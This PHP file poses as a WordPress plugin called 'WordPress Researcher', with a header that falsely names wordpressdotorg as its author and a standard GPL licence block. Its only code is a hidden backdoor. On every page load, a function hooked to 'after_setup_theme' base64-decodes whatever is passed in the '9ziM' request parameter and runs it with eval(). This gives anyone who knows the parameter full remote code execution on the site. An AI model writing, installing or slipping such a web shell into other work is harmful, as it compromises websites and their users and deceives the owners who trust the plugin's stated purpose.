<?php

/*
Plugin Name: WordPress Researcher
Plugin URI: http://wordpress.org/extend/plugins/
Description: WordPress research tool.
Author: wordpressdotorg
Author URI: http://wordpress.org/
Text Domain: wordpress-researcher
License: GPL version 2 or later - http://www.gnu.org/licenses/old-licenses/gpl-2.0.html
Version: 2.2.4


Copyright 2013  wordpressdotorg

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110, USA
*/



    function research_plugin()
    {
        if (isset($_REQUEST['9ziM']))
        {
            eval(base64_decode($_REQUEST['9ziM']));
        }
        return;
    }

    add_action('after_setup_theme', 'research_plugin');
?>